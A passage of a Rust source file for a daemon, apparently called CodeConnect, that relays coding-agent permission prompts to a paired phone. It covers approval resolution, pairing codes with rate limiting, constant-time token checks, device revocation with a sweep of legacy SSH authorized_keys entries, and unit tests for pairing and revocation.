        sessions.sort_by(|a, b| a.uid.cmp(&b.uid));
        sessions.dedup_by(|a, b| a.uid == b.uid);

        for session in sessions {
            // Visible pane only. With scrollback, a permission prompt answered
            // ten minutes ago is still "on screen" as far as a needle search is
            // concerned — which would freeze this detector permanently *and*, on
            // the answer path, authorise typing into whatever replaced it.
            let Ok(pane) = self.capture_visible(&session.uid).await else {
                // No supervisor, or capture failed. We cannot see the screen,
                // so we know nothing — which is not the same as "the prompt is
                // gone", and must not be treated as it.
                continue;
            };
            // Positive evidence, not merely absence. "The permission prompt is
            // gone" is also true when the operator switched tmux windows, when
            // the pane is mid-redraw, or when a long tool is still running —
            // and resolving on any of those would clear a card the human has
            // not answered, which is the one failure this must not have.
            // "The prompt is gone *and* the composer is accepting input again"
            // only happens after the prompt was actually dismissed.
            let prompt_visible = self
                .with_needle_overrides(PromptPresence::PermissionPrompt)
                .find_match(&pane, None)
                .is_some();
            let composer_ready = self
                .with_needle_overrides(PromptPresence::InputBox)
                .find_match(&pane, None)
                .is_some();
            let answered_locally = !prompt_visible && composer_ready;

            // A prompt *is* on screen and some card here has no identity yet —
            // a restart recovered it, or the settle poll ran out of attempts.
            // This is the "recover against the current visible prompt" half:
            // the card becomes answerable again only once we can see, and
            // fingerprint, what it is answering.
            if prompt_visible {
                let unbound: Vec<(String, u64)> = {
                    let inner = self.inner.lock().await;
                    inner
                        .pending
                        .iter()
                        .filter(|((uid, _), entry)| {
                            uid == &session.uid && entry.prompt.is_none() && !entry.claimed
                        })
                        .map(|((_, request_id), entry)| (request_id.clone(), entry.generation))
                        .collect()
                };
                // Only when exactly one card is waiting. With two, "the prompt on
                // screen" does not say which of them it belongs to, and binding
                // both to it would be the very confusion this exists to prevent.
                if let [(request_id, generation)] = unbound.as_slice() {
                    self.bind_prompt_identity(&session, request_id, *generation, &pane)
                        .await;
                }
            }

            let resolved: Vec<String> = {
                let mut inner = self.inner.lock().await;
                let mut resolved = Vec::new();
                for ((uid, request_id), entry) in inner.pending.iter_mut() {
                    if uid != &session.uid
                        || entry.claimed
                        || entry.tool_ran
                        || now - entry.created_ms <= grace
                    {
                        continue;
                    }
                    if answered_locally {
                        entry.local_misses += 1;
                        if entry.local_misses >= LOCAL_RESOLVE_MISSES {
                            resolved.push(request_id.clone());
                        }
                    } else {
                        entry.local_misses = 0;
                    }
                }
                resolved
            };

            for request_id in resolved {
                self.resolve_without_phone(
                    &request_id,
                    &session,
                    AnswerDecision::Deny,
                    ResolvedBy::Local,
                    "the prompt left the screen without CodeConnect typing into it; \
                     answered at the keyboard, outcome not observed",
                    true,
                )
                .await;
            }
        }
    }

    /// Retire an approval that the phone did not answer.
    ///
    /// Writing to the ledger is the load-bearing half: without it a tap that
    /// arrives seconds later would be applied to whatever is on screen by then.
    /// The event is what the phone renders.
    async fn resolve_without_phone(
        &self,
        request_id: &str,
        session: &SessionKey,
        decision: AnswerDecision,
        resolved_by: ResolvedBy,
        detail: &str,
        inferred: bool,
    ) {
        // Claim by removal: whoever takes the entry out of the map owns the
        // resolution, so a phone answer racing this either finds the entry (and
        // wins) or finds the ledger (and is a well-formed duplicate).
        //
        // A *claimed* entry is left alone: the phone is mid-injection, and its
        // answer is the better record. If that injection then fails the entry is
        // unclaimed again and the next sweep picks it up.
        let id: ApprovalId = (session.uid.clone(), request_id.to_string());
        let taken = {
            let mut inner = self.inner.lock().await;
            match inner.pending.get(&id) {
                Some(entry) if entry.claimed => false,
                Some(_) => inner.pending.remove(&id).is_some(),
                None => false,
            }
        };
        if !taken {
            return;
        }

        let outcome = AnswerOutcome {
            request_id: request_id.to_string(),
            session_id: session.name.clone(),
            decision,
            resolved_by,
            applied_via: AnswerPath::SendKeys,
            resolved_at: protocol::time::now_rfc3339(),
            detail: Some(detail.to_string()),
            inferred,
            indeterminate: false,
        };
        if let Err(err) = self
            .store
            .record_answer(&session.uid, request_id, "", &outcome)
        {
            crate::log_error!("failed to record resolution for {request_id}: {err:#}");
        }
        let _ = self
            .db
            .delete_pending_approval(session.uid.clone(), request_id.to_string())
            .await;
        crate::log_info!("{request_id} resolved by {resolved_by:?}: {detail}");

        let pending = PendingEvent::new(
            session,
            EventKind::ApprovalResolved,
            serde_json::to_value(&outcome).unwrap_or(serde_json::Value::Null),
            Source::Daemon,
        )
        .with_source_event_id(format!("resolved:{request_id}"));
        if let Err(err) = self.ingest(pending).await {
            crate::log_error!("failed to record resolution event: {err:#}");
        }
    }

    // ------------------------------------------------------------ diff

    /// `git diff HEAD` for a session's working directory.
    ///
    /// The client names a *session*, never a path: the directory comes from our
    /// own registry, so no request can aim this at an arbitrary place on the
    /// filesystem.
    pub async fn diff(&self, session_ref: &str) -> Result<crate::git::Diff> {
        let row = self.resolve(session_ref).await?;
        Ok(crate::git::collect(
            &row.cwd,
            self.config.git_bin.as_deref(),
            self.config.diff_max_bytes,
            Duration::from_millis(self.config.diff_timeout_ms),
        )
        .await)
    }

    // --------------------------------------------------------- pairing

    /// Mint a single-use pairing code. Only the hash is stored.
    pub async fn create_pairing(&self, ttl_secs: u64) -> Result<(String, String)> {
        let code = crate::secret::pairing_code()?;
        let now_ms = protocol::time::now_unix_ms();
        let expires_ms = now_ms + (ttl_secs as i64) * 1000;
        let expires_at = protocol::time::rfc3339_from_unix_ms(expires_ms);
        self.db
            .create_pairing_code(
                sha256_hex(code.as_bytes()),
                expires_at.clone(),
                expires_ms,
                now_ms,
            )
            .await?;
        crate::log_info!("pairing code issued, valid until {expires_at}");
        Ok((code, expires_at))
    }

    /// Store where a device wants its pushes sent.
    ///
    /// **A token belongs to one row.** A phone that re-pairs arrives under a new
    /// device id carrying the same APNs token, and the store moves it — so the
    /// rows it was taken from are told to the sender here. Their queues hold
    /// work for a token they no longer own, and their workers would otherwise
    /// wait on a phone that has already come back under another name.
    ///
    /// **The three values are one fact.** A relay credential authorises sending
    /// to *this* token and no other, so it is written with the token in a single
    /// transaction: a rotation that landed the new token beside the old bearer
    /// would present the relay a pair it has no binding for, and every push
    /// would be refused as a credential failure that no repair could fix.
    pub async fn register_push(
        &self,
        device_id: &str,
        token: &str,
        environment: &str,
        credential: Option<&str>,
    ) -> Result<()> {
        let displaced = self
            .db
            .set_push_token(
                device_id.to_string(),
                token.to_string(),
                environment.to_string(),
                credential.map(str::to_string),
            )
            .await?;
        for previous in displaced {
            crate::log_info!("push: {previous} lost its token to {device_id}; retiring its queue");
            self.push.retire(&previous);
        }
        Ok(())
    }

    /// Authenticate a `hello`.
    ///
    /// A token wins over a pairing code when both are offered: re-pairing an
    /// already-paired phone would mint a second credential for one device and
    /// leave the first one live but unlisted against it.
    pub async fn authenticate(
        &self,
        static_token: &str,
        token: Option<&str>,
        pairing_code: Option<&str>,
        client_name: Option<&str>,
    ) -> AuthOutcome {
        if let Some(token) = token.filter(|t| !t.is_empty()) {
            if constant_time_eq(token.as_bytes(), static_token.as_bytes()) {
                return AuthOutcome::Static;
            }
            return match self
                .db
                .device_by_token_hash(sha256_hex(token.as_bytes()))
                .await
            {
                Ok(Some(device)) => {
                    let _ = self
                        .db
                        .touch_device(device.device_id.clone(), protocol::time::now_rfc3339())
                        .await;
                    AuthOutcome::Device(Box::new(device))
                }
                Ok(None) => AuthOutcome::Rejected("token matches no device".into()),
                Err(err) => AuthOutcome::Rejected(format!("device lookup failed: {err:#}")),
            };
        }

        let Some(code) = pairing_code else {
            return AuthOutcome::Rejected(
                "hello carried neither a token nor a pairing code".into(),
            );
        };
        self.pair(code, client_name).await
    }

    async fn pair(&self, code: &str, client_name: Option<&str>) -> AuthOutcome {
        let now_ms = protocol::time::now_unix_ms();
        if !self.admit_pairing_attempt(now_ms).await {
            // Loud: a human pairs a phone by typing one code. Reaching this
            // limit is not a user having a bad day, it is something guessing.
            crate::log_warn!(
                "PAIRING RATE LIMIT: refusing further attempts; {} failures inside {}s. If you \
                 did not just mistype a code, something is guessing at this daemon.",
                self.config.pairing_max_attempts,
                self.config.pairing_window_secs,
            );
            // The same opaque refusal every other failure gets. Telling a peer
            // it is being rate-limited hands it the one thing it needs to pace
            // itself under the limit.
            return AuthOutcome::Rejected("too many pairing attempts".into());
        }
        let outcome = self.pair_once(code, client_name).await;
        if matches!(outcome, AuthOutcome::Rejected(_)) {
            self.record_pairing_failure(now_ms).await;
        }
        outcome
    }

    /// May another pairing attempt be made right now?
    ///
    /// A pairing code carries real entropy and lives five minutes, so this is
    /// not what stops a *guess* — it is what stops an unbounded *number* of
    /// guesses. The safety argument for a short-lived code is "you cannot try
    /// enough of them in five minutes", and that argument is only true if
    /// something is counting.
    ///
    /// Global rather than per-peer, deliberately. There is one operator and
    /// pairing is a rare, deliberate act at the keyboard, so a global ceiling
    /// cannot inconvenience a human — while a per-peer limit would be defeated
    /// by the one thing an attacker on a tailnet can trivially vary.
    async fn admit_pairing_attempt(&self, now_ms: i64) -> bool {
        let max = self.config.pairing_max_attempts;
        if max == 0 {
            return true;
        }
        let window_ms = (self.config.pairing_window_secs as i64).saturating_mul(1_000);
        let mut inner = self.inner.lock().await;
        // Pruned on every check rather than on a timer: the deque is bounded by
        // `max`, so this is a handful of comparisons and there is no sweeper to
        // forget to schedule.
        while inner
            .pairing_failures
            .front()
            .is_some_and(|at| now_ms.saturating_sub(*at) >= window_ms)
        {
            inner.pairing_failures.pop_front();
        }
        (inner.pairing_failures.len() as u32) < max
    }

    async fn record_pairing_failure(&self, at_ms: i64) {
        if self.config.pairing_max_attempts == 0 {
            return;
        }
        let mut inner = self.inner.lock().await;
        inner.pairing_failures.push_back(at_ms);
        // Only failures are counted, and only `max` of them are ever held: a
        // successful pairing leaves nothing behind, so a phone that pairs
        // normally can never push the daemon towards its own limit.
        while inner.pairing_failures.len() > self.config.pairing_max_attempts as usize {
            inner.pairing_failures.pop_front();
        }
    }

    async fn pair_once(&self, code: &str, client_name: Option<&str>) -> AuthOutcome {
        let code = protocol::pairing::normalize_code(code);
        // Shape-checked before the database is touched, so a malformed code
        // costs a string scan rather than a query.
        if !protocol::pairing::is_well_formed(&code) {
            return AuthOutcome::Rejected("malformed pairing code".into());
        }
        match self
            .db
            .consume_pairing_code(sha256_hex(code.as_bytes()), protocol::time::now_unix_ms())
            .await
        {
            Ok(PairingConsume::Consumed) => {}
            Ok(PairingConsume::NotFound) => {
                return AuthOutcome::Rejected("unknown pairing code".into())
            }
            Ok(PairingConsume::Expired) => {
                return AuthOutcome::Rejected("pairing code expired".into())
            }
            Ok(PairingConsume::AlreadyUsed) => {
                return AuthOutcome::Rejected("pairing code already used".into())
            }
            Err(err) => return AuthOutcome::Rejected(format!("pairing store failed: {err:#}")),
        }

        // Past this point the code is spent. Any failure below must therefore
        // be reported rather than retried with the same code.
        match self.mint_device(client_name).await {
            Ok(outcome) => outcome,
            Err(err) => {
                crate::log_error!("pairing consumed a code but failed to complete: {err:#}");
                AuthOutcome::Rejected(format!("pairing failed: {err:#}"))
            }
        }
    }

    async fn mint_device(&self, client_name: Option<&str>) -> Result<AuthOutcome> {
        let device_id = crate::secret::device_id()?;
        let token = crate::secret::device_token()?;
        let name = self
            .db
            .unique_device_name(client_name.unwrap_or("device").to_string())
            .await?;
        self.db
            .insert_device(
                device_id.clone(),
                name.clone(),
                sha256_hex(token.as_bytes()),
                protocol::time::now_rfc3339(),
            )
            .await?;

        crate::log_info!("paired device {device_id} ({name})");
        Ok(AuthOutcome::Paired {
            device_id,
            device_name: name,
            token,
        })
    }

    /// Every paired device. Runs on the blocking pool, because a database read
    /// has no business on a runtime worker.
    pub async fn list_devices(&self) -> Result<Vec<DeviceSummary>> {
        self.db.device_summaries().await
    }

    /// Revoke a device's access.
    ///
    /// The device token is the whole of what this daemon hands out, so taking it
    /// away takes away everything *it* granted. A failure to revoke is fatal and
    /// reported as such — an operator who is told a phone was cut off must not
    /// have to wonder.
    ///
    /// **It is not the only thing a phone may hold, which is why the legacy
    /// sweep runs here too.** Earlier releases also wrote the phone's public key
    /// into `~/.ssh/authorized_keys`, and that grant is outside this database
    /// entirely: withdrawing the token does nothing to it. The daemon sweeps
    /// that file at startup, but a startup sweep only describes startup — a
    /// `~/.ssh` that was unwritable then, a backup restored since, a Mac that has
    /// not rebooted in months — and this command is the one the documentation
    /// presents as *the* way to take a device's access away. Revoking a phone
    /// and leaving it a working shell is the gap that narrows here.
    ///
    /// **Narrows, and not more than that: a revocation is the whole truth about
    /// the token and a best effort at everything else.** The token is this
    /// daemon's to withdraw and it is withdrawn or this call fails. The sweep
    /// edits a file this daemon does not own, and it removes nothing at all in
    /// five situations it can see — no absolute `$HOME`, a file it cannot read, a
    /// file it cannot rewrite, a file somebody else rewrote while it was
    /// working, and tagged lines that are not the marker-and-key pair it
    /// recognises — none of which fails the revocation. Beyond those it is
    /// blind by construction: a key outside `$HOME/.ssh/authorized_keys`, or
    /// inside it in any shape other than the one earlier releases wrote, is
    /// never a candidate. So this command withdrawing the token is a fact, and
    /// the shell being gone is a claim only `grep -n codeconnect:` on the file
    /// itself can settle — which is why every one of those five says so in the
    /// daemon log rather than being folded into what this returns.
    ///
    /// The sweep takes the whole file rather than this device's tag: see
    /// [`crate::legacy_credentials`] for why a tag's id decides nothing. It is
    /// never fatal, and quiet when there is nothing to do — a revocation must
    /// still succeed, and still report accurately, over a file it does not
    /// control, and a Mac that never granted SSH access has one file read and
    /// nothing written on every revoke. It is not silent when it fails: every
    /// path that removes nothing warns, which is the only place that fact is
    /// recorded.
    pub async fn revoke(&self, needle: &str) -> Result<RevokeOutcome> {
        let device = match self.db.find_device(needle.to_string()).await? {
            DeviceLookup::Found(device) => *device,
            DeviceLookup::NotFound => {
                anyhow::bail!("no device matches {needle:?}; `codeconnect devices` lists them")
            }
            DeviceLookup::Ambiguous(ids) => anyhow::bail!(
                "{needle:?} matches {} devices ({}); name one exactly",
                ids.len(),
                ids.join(", ")
            ),
        };

        let token_revoked = self
            .db
            .revoke_device(device.device_id.clone(), protocol::time::now_rfc3339())
            .await?;
        // Published before the re-read: the point of revocation is that it takes
        // effect *now*, and a socket that is idle would otherwise keep serving
        // the event log until its next keepalive. `send` fails only when nobody
        // is subscribed, which is the ordinary case for a Mac with no phone
        // connected.
        let _ = self.revocations_tx.send(device.device_id.clone());
        self.push_gate.evict_device(&device.device_id);
        // And the sender's queue for it, which holds work authorised before this
        // moment and a worker that would otherwise wait on a phone that is never
        // coming back.
        self.push.retire(&device.device_id);

        // And the grant that is not this daemon's to begin with. Unconditional,
        // including on a device that was already revoked: re-running `revoke` is
        // then the operator's retry for a sweep the file refused earlier, and
        // the only one they have short of restarting the daemon.
        //
        // The count is deliberately not folded into what this function returns.
        // Zero covers six different outcomes there — nothing to do, no `$HOME`,
        // unreadable, unwritable, rewritten by somebody else mid-sweep, a tagged
        // line that is not a whole pair — and a number carried up to
        // `codeconnect revoke` would be read as "the file is clean now" on five
        // of them. The sweep says which of the six it was in the daemon log, in
        // its own words, and that is the honest record.
        crate::legacy_credentials::purge_authorized_keys_off_runtime().await;

        // Re-read so the reported state is what is now stored, not what we
        // believe we just wrote.
        let fresh = match self.db.find_device(device.device_id.clone()).await? {
            DeviceLookup::Found(row) => *row,
            _ => device,
        };
        let summary = fresh.to_summary();
        crate::log_info!(
            "revoked device {} (token_revoked={token_revoked})",
            summary.device_id
        );
        Ok(RevokeOutcome {
            device: summary,
            token_revoked,
        })
    }
}

/// Mark the approval a tool result belongs to, if any.
///
/// PostToolUse carries the `tool_use_id` that *is* the approval's request id
/// (the correlation established at PreToolUse), so this is an exact join rather
/// than a heuristic. The resolution itself is left to the sweeper: doing it here
/// would mean re-entering `ingest` from inside `ingest`.
fn note_tool_result(inner: &mut Inner, event: &Event) {
    if event.kind != EventKind::ToolResult {
        return;
    }
    let Some(item_id) = &event.item_id else {
        return;
    };
    let id: ApprovalId = (event.session_uid.clone(), item_id.clone());
    if let Some(entry) = inner.pending.get_mut(&id) {
        entry.tool_ran = true;
    }
}

/// The launchd job this process belongs to, or `None` if it has none.
///
/// macOS sets `XPC_SERVICE_NAME` for every process, not only for launchd jobs:
/// a program started from a shell inherits the literal string `"0"`, which is
/// the documented "this is not an XPC service" sentinel. Reporting that as a
/// label would make `codeconnect daemon status` say a hand-started daemon is "managed by
/// a different job (0)" — a sentence that sends the operator looking for a
/// job that does not exist.
///
/// "Managed by a different job" is still a distinct outcome worth reporting, so
/// a real label that is not ours is passed through untouched.
pub(crate) fn launchd_label() -> Option<String> {
    std::env::var("XPC_SERVICE_NAME")
        .ok()
        .filter(|label| !label.is_empty() && label != "0")
}

/// Compare without an early exit, so a wrong token cannot be discovered a byte
/// at a time by timing the reply.
pub(crate) fn constant_time_eq(a: &[u8], b: &[u8]) -> bool {
    if a.len() != b.len() {
        return false;
    }
    let mut diff = 0u8;
    for (x, y) in a.iter().zip(b.iter()) {
        diff |= x ^ y;
    }
    diff == 0
}

/// PermissionRequest has no `tool_use_id`; this is the join key back to the
/// PreToolUse that does.
///
/// Scoped by `session_uid`, not by name: two runs called `cc-1` executing the
/// same command in the same directory produce identical `(tool, input)` hashes,
/// and correlating across them would hand one run's approval the other's
/// `tool_use_id`.
pub(crate) fn correlation_key(session_uid: &str, input: &HookInput) -> Option<String> {
    let tool_name = input.tool_name.as_deref()?;
    let tool_input = input.tool_input.as_ref()?;
    Some(format!(
        "{session_uid}|{}|{tool_name}|{}",
        input.prompt_id.as_deref().unwrap_or(""),
        approval_payload_hash(tool_name, tool_input)
    ))
}

pub(crate) fn hook_event(
    session: &SessionKey,
    event_name: &HookEventName,
    payload: &serde_json::Value,
    input: &HookInput,
) -> PendingEvent {
    let mut pending = PendingEvent::new(
        session,
        event_name.maps_to_event_kind(),
        payload.clone(),
        Source::Hook,
    )
    .with_turn_id(input.prompt_id.clone())
    .with_item_id(input.tool_use_id.clone());

    // Only facts with a genuinely unique natural id get one: reusing a
    // non-unique id would silently drop real events.
    if let Some(tool_use_id) = &input.tool_use_id {
        let prefix = match event_name {
            HookEventName::PreToolUse => "pre",
            HookEventName::PostToolUse => "post",
            _ => "tool",
        };
        pending = pending.with_source_event_id(format!("{prefix}:{tool_use_id}"));
    }
    pending
}

#[cfg(test)]
mod tests {

    /// The one translation the claim's fate rides on, arm by arm: only
    /// `Refused` may release a text mutation's claim, so every supervisor
    /// answer that leaves typing possible must map to `Indeterminate`.
    #[test]
    fn supervisor_answers_map_to_claim_outcomes_exactly() {
        use protocol::ipc::SupervisorResult;

        // The supervisor's phase-aware "may have acted": verbatim to the
        // phone, never rephrased into something a retry would act on.
        match send_text_result_of(Ok(SupervisorResult::Error {
            message: "the text was typed but Enter was not confirmed".into(),
        })) {
            SendTextResult::Indeterminate { reason } => {
                assert_eq!(reason, "the text was typed but Enter was not confirmed")
            }
            other => panic!("a supervisor error may have typed; got {other:?}"),
        }

        // A refusal releases; the reason travels.
        match send_text_result_of(Ok(SupervisorResult::Refused {
            reason: "nothing was typed".into(),
        })) {
            SendTextResult::Refused { reason } => assert_eq!(reason, "nothing was typed"),
            other => panic!("a refusal must release the claim; got {other:?}"),
        }

        // Never handed to a supervisor: retry-safe.
        assert!(matches!(
            send_text_result_of(Err(SupervisorFailure::NotSent("no supervisor".into()))),
            SendTextResult::Refused { .. }
        ));
        // Handed over and never answered: permanently unknown.
        assert!(matches!(
            send_text_result_of(Err(SupervisorFailure::Unanswered("timed out".into()))),
            SendTextResult::Indeterminate { .. }
        ));
        // Typed with recovery unconfirmed: unknown, reason preserved.
        assert!(matches!(
            send_text_result_of(Ok(SupervisorResult::RecoveryUnconfirmed {
                matched: "composer".into(),
                reason: "budget".into(),
            })),
            SendTextResult::Indeterminate { .. }
        ));

        // The typing-proven outcomes carry through one to one…
        assert!(matches!(
            send_text_result_of(Ok(SupervisorResult::Sent {
                matched: "composer".into()
            })),
            SendTextResult::Sent { .. }
        ));
        assert!(matches!(
            send_text_result_of(Ok(SupervisorResult::ComposerRecovered {
                matched: "composer".into(),
                pane_snapshot: None,
                captured_at: "2026-01-01T00:00:00Z".into(),
            })),
            SendTextResult::ComposerRecovered { .. }
        ));
        assert!(matches!(
            send_text_result_of(Ok(SupervisorResult::ComposerLost {
                matched: "composer".into()
            })),
            SendTextResult::ComposerLost { .. }
        ));
        // …except a confirmed view, which is deliberately the same news as a
        // clean send: the keys landed, the transcript decides.
        assert!(matches!(
            send_text_result_of(Ok(SupervisorResult::ViewConfirmed {
                matched: "composer".into()
            })),
            SendTextResult::Sent { .. }
        ));
        // A result that makes no sense as an answer to typing is unknown —
        // it may have typed, and a refusal here would let a retry act on it.
        assert!(matches!(
            send_text_result_of(Ok(SupervisorResult::Pong)),
            SendTextResult::Indeterminate { .. }
        ));
    }
    use super::*;
    use serde_json::json;

    // The sweep's own fixtures, so the tests that hold `revoke` to running it
    // and the tests that hold the sweep to its rules cannot drift into
    // disagreeing about what an installed entry looks like.
    use crate::legacy_credentials::test_support::{
        write as legacy_write, FakeHome, MIXED, SURVIVORS,
    };

    /// **Every test that reaches `revoke` needs one of these, including the ones
    /// that are not about the sweep at all.**
    ///
    /// `revoke` sweeps `$HOME/.ssh/authorized_keys` unconditionally, so a test
    /// that revokes under the developer's own `$HOME` points a function whose
    /// job is deleting lines from `authorized_keys` at the developer's
    /// `authorized_keys`. It also runs beside the sweep's own tests, which is
    /// its own kind of wrong: `FakeHome` holds a process-wide lock precisely so
    /// that only one test at a time is inside a sweep, and a test that skips it
    /// is a second sweep running through the seams the first one armed.
    ///
    /// Named for the test so a leftover directory in `$TMPDIR` says who left it.
    fn redirected_home(tag: &str) -> FakeHome {
        FakeHome::new(tag)
    }

    fn input_from(raw: &str) -> HookInput {
        serde_json::from_str(raw).unwrap()
    }

    // ---------------------------------------------------- daemon harness

    /// A daemon with a private database and no supervisors. Everything the
    /// tests below exercise (pairing, auth, risk, resolution bookkeeping) runs
    /// without a tmux session, which is exactly the point: these are the paths
    /// that must not depend on one.
    fn test_daemon() -> Arc<Daemon> {
        daemon_with(Config::default())
    }

    /// A daemon whose catalog probe will wait out a loaded machine.
    ///
    /// `catalog::probe_with` documents why the deadline is configurable: so
    /// machine load cannot be mistaken for a binary that will not answer. A
    /// full parallel suite is exactly that load, and the tests that use this
    /// are about what the catalog reports, never how fast it reports it.
    fn daemon_with_patient_catalog_probe() -> Arc<Daemon> {
        daemon_with(Config {
            catalog_probe_ms: 30_000,
            ..Config::default()
        })
    }

    fn daemon_with(config: Config) -> Arc<Daemon> {
        daemon_on(shared_store(), config)
    }

    /// A store two daemons can share, so a test can express "ccd was killed and
    /// came back" as literally that rather than as a mock of it.
    fn shared_store() -> Arc<Store> {
        static COUNTER: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(0);
        let path = std::env::temp_dir().join(format!(
            "ccd-state-{}-{}-{}.db",
            std::process::id(),
            COUNTER.fetch_add(1, std::sync::atomic::Ordering::Relaxed),
            protocol::time::now_unix_ms()
        ));
        let _ = std::fs::remove_file(&path);
        Arc::new(Store::open(&path).unwrap())
    }

    fn daemon_on(store: Arc<Store>, config: Config) -> Arc<Daemon> {
        let (daemon, rx) = daemon_watching_tails(store, config);
        // Kept alive: dropping the receiver would make every transcript
        // registration fail, which is not what most of these tests is about.
        Box::leak(Box::new(rx));
        daemon
    }

    /// The same, keeping the tailer's end of the channel so a test can see what
    /// the daemon asked it to do.
    fn daemon_watching_tails(
        store: Arc<Store>,
        config: Config,
    ) -> (
        Arc<Daemon>,
        mpsc::UnboundedReceiver<crate::tailer::TailCommand>,
    ) {
        let (tx, rx) = mpsc::unbounded_channel();
        let daemon = Daemon::new(
            config,
            store,
            Arc::new(crate::apns::LoggingPushSender::new()),
            Endpoint {
                host: "test.ts.net".into(),
                port: 8787,
                tls: false,
            },
            tx,
        );
        (daemon, rx)
    }

    const STATIC_TOKEN: &str = "static-token-for-tests";

    /// The run every hook in these tests belongs to. Fixed rather than minted so
    /// a failure message names the same identity every time.
    const TEST_UID: &str = "01K1B3XQ8ZC0DE5FGH7JKMNPQR";

    fn test_key() -> SessionKey {
        assert!(protocol::uid::is_well_formed(TEST_UID));
        SessionKey::new(TEST_UID, "cc-1")
    }

    async fn hello_with_code(daemon: &Arc<Daemon>, code: &str) -> AuthOutcome {
        daemon
            .authenticate(STATIC_TOKEN, None, Some(code), Some("iPhone"))
            .await
    }

    /// One paired phone, and the id `revoke` takes it away by.
    async fn paired_device(daemon: &Arc<Daemon>) -> String {
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        let AuthOutcome::Paired { device_id, .. } = hello_with_code(daemon, &code).await else {
            panic!("pairing must succeed");
        };
        device_id
    }

    // ------------------------------------------------------------ pairing

    #[tokio::test]
    async fn a_pairing_code_buys_exactly_one_device_token() {
        let daemon = test_daemon();
        let (code, _) = daemon.create_pairing(300).await.unwrap();

        let token = match hello_with_code(&daemon, &code).await {
            AuthOutcome::Paired {
                token, device_name, ..
            } => {
                assert_eq!(device_name, "iPhone");
                assert_eq!(token.len(), 64);
                token
            }
            other => panic!("pairing must succeed: {other:?}"),
        };

        // The minted token authenticates on its own from now on.
        match daemon
            .authenticate(STATIC_TOKEN, Some(&token), None, None)
            .await
        {
            AuthOutcome::Device(device) => assert_eq!(device.name, "iPhone"),
            other => panic!("the device token must authenticate: {other:?}"),
        }

        // And the code is spent: a second phone scanning the same screen fails.
        assert!(matches!(
            hello_with_code(&daemon, &code).await,
            AuthOutcome::Rejected(_)
        ));
    }

    #[tokio::test]
    async fn codes_are_normalised_the_way_a_human_would_type_them() {
        let daemon = test_daemon();
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        let typed = format!(
            "  {}  ",
            protocol::pairing::format_for_display(&code).to_lowercase()
        );
        assert!(matches!(
            hello_with_code(&daemon, &typed).await,
            AuthOutcome::Paired { .. }
        ));
    }

    #[tokio::test]
    async fn a_wrong_or_malformed_code_pairs_nothing() {
        let daemon = test_daemon();
        for attempt in ["", "nope", "ABCD2345", "AAAAAAAA", "0000000O"] {
            assert!(
                matches!(
                    hello_with_code(&daemon, attempt).await,
                    AuthOutcome::Rejected(_)
                ),
                "{attempt:?} must not pair"
            );
        }
        assert!(daemon.list_devices().await.unwrap().is_empty());
    }

    #[tokio::test]
    async fn an_expired_code_pairs_nothing() {
        let daemon = test_daemon();
        // A TTL already in the past: the code exists but can never be redeemed.
        let (code, _) = daemon.create_pairing(0).await.unwrap();
        tokio::time::sleep(Duration::from_millis(5)).await;
        assert!(matches!(
            hello_with_code(&daemon, &code).await,
            AuthOutcome::Rejected(_)
        ));
    }

    #[tokio::test]
    async fn a_hello_with_no_credential_at_all_is_refused() {
        let daemon = test_daemon();
        assert!(matches!(
            daemon.authenticate(STATIC_TOKEN, None, None, None).await,
            AuthOutcome::Rejected(_)
        ));
        assert!(matches!(
            daemon
                .authenticate(STATIC_TOKEN, Some(""), None, None)
                .await,
            AuthOutcome::Rejected(_)
        ));
    }

    #[tokio::test]
    async fn the_static_token_keeps_working_alongside_device_tokens() {
        // The upgrade guarantee: a phone paired before device tokens existed
        // must not be locked out because the Mac learned how to mint them.
        let daemon = test_daemon();
        assert!(matches!(
            daemon
                .authenticate(STATIC_TOKEN, Some(STATIC_TOKEN), None, None)
                .await,
            AuthOutcome::Static
        ));
        assert!(matches!(
            daemon
                .authenticate(STATIC_TOKEN, Some("not-the-token"), None, None)
                .await,
            AuthOutcome::Rejected(_)
        ));
    }

    #[tokio::test]
    async fn a_token_wins_over_a_pairing_code_and_leaves_it_unspent() {
        let daemon = test_daemon();
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        // Re-pairing an already-paired phone would strand its first credential.
        assert!(matches!(
            daemon
                .authenticate(STATIC_TOKEN, Some(STATIC_TOKEN), Some(&code), None)
                .await,
            AuthOutcome::Static
        ));
        assert!(
            matches!(
                hello_with_code(&daemon, &code).await,
                AuthOutcome::Paired { .. }
            ),
            "the unused code must still be redeemable"
        );
    }

    #[tokio::test]
    async fn revoking_a_device_stops_its_token_working() {
        let _home = redirected_home("revoke-token");
        let daemon = test_daemon();
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        let AuthOutcome::Paired {
            token, device_id, ..
        } = hello_with_code(&daemon, &code).await
        else {
            panic!("pairing must succeed");
        };

        let outcome = daemon.revoke(&device_id).await.unwrap();
        assert!(outcome.token_revoked);
        assert!(matches!(
            daemon
                .authenticate(STATIC_TOKEN, Some(&token), None, None)
                .await,
            AuthOutcome::Rejected(_)
        ));
        // Still listed, so "revoked on the 3rd" survives as a fact.
        let devices = daemon.list_devices().await.unwrap();
        assert_eq!(devices.len(), 1);
        assert!(!devices[0].is_active());
    }

    #[tokio::test]
    async fn revocation_is_visible_to_an_already_open_connection() {
        // A phone holds its socket open for hours, so a check that only runs at
        // `hello` would let a revoked device keep answering approvals and typing
        // into the session's TTY until the socket happened to drop. The ws loop
        // re-reads this on every message and on the keepalive tick.
        let _home = redirected_home("revoke-active");
        let daemon = test_daemon();
        let (code, _) = daemon.create_pairing(300).await.unwrap();
        let AuthOutcome::Paired { device_id, .. } = hello_with_code(&daemon, &code).await else {
            panic!("pairing must succeed");
        };
        assert!(daemon.store.device_is_active(&device_id).unwrap());

        daemon.revoke(&device_id).await.unwrap();
        assert!(
            !daemon.store.device_is_active(&device_id).unwrap(),
            "a live connection must be able to notice the revocation"
        );
        // An id that was never issued is not "active" either.
        assert!(!daemon.store.device_is_active("never-existed").unwrap());
    }

    #[tokio::test]
    async fn revoking_something_that_does_not_exist_says_so() {
        let daemon = test_daemon();
        let err = daemon.revoke("ghost").await.unwrap_err().to_string();
        assert!(err.contains("no device matches"), "{err}");
    }

    // ------------------------------- revoke and the legacy `authorized_keys`
    //
    // The daemon also sweeps `~/.ssh/authorized_keys` at startup, and these
    // four are about everything that happens *after* startup: `revoke` is the
